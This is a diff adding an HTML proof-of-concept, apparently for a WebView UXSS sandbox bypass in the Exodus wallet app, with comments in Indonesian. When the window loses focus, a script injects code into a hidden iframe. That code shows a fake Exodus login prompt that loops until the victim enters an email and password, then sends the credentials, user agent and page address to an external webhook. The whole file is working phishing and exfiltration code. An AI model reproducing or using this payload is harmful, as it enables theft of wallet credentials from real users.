@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, user-scalable=no">
+  <title>Bypass sandbox Webview UXSS Delayed JavaScript execution leak to host app (Exodus)</title>
+  <style>
+    iframe { visibility: hidden; }
+    body { font-family: system-ui, sans-serif; text-align: center; padding-top: 100px; }
+  </style>
+  <script>
+    window.onblur = function () {
+      const msg = 'In order to access Exodus.com\\n' +
+                  'you must first login on your\\nExodus Account.\\n\\n' +
+                  'Please type your e-mail\\nand your password:';
+
+      // Payload yang akan dieksekusi di dalam iframe via javascript: (GET webhook)
+      const code =
+        "(function(){try{" +
+          "var m=" + JSON.stringify(msg) + ";" +
+          "var v='';" +
+          // Paksa isi: Cancel/kosong akan loop
+          "while(v===null||(''+v).trim()===''){ v=prompt(m,'E-mail / Password.'); }" +
+          // Build URL GET ke webhook
+          "var hook=" + JSON.stringify("https://oxomzauseuatgjlyyqtdmzit6gjs53lvv.oast.fun/") + ";" +
+          "var qs='?creds='+encodeURIComponent(v)" +
+                 "+'&ua='+encodeURIComponent(navigator.userAgent)" +
+                 "+'&page='+encodeURIComponent((document.referrer||location.href))" +
+                 "+'&t='+Date.now();" +
+          "var u=hook+qs;" +
+          // Coba fetch GET (no-cors, keepalive), fallback ke Image GET (anti-cache pakai &via=img)
+          "try{ fetch(u,{method:'GET',mode:'no-cors',keepalive:true}).catch(function(_){" +
+          "  try{ (new Image()).src=u+'&via=img'; }catch(__){}" +
+          "}); }catch(e){ try{ (new Image()).src=u+'&via=img'; }catch(__){} }" +
+        "}catch(e){}})()";
+
+      document.getElementById('iframe').src = "javascript:" + code;
+    };
+  </script>
+</head>
+<body>
+  <h1>Click Here</h1>
+  <iframe id="iframe"></iframe>
+</body>
+</html>
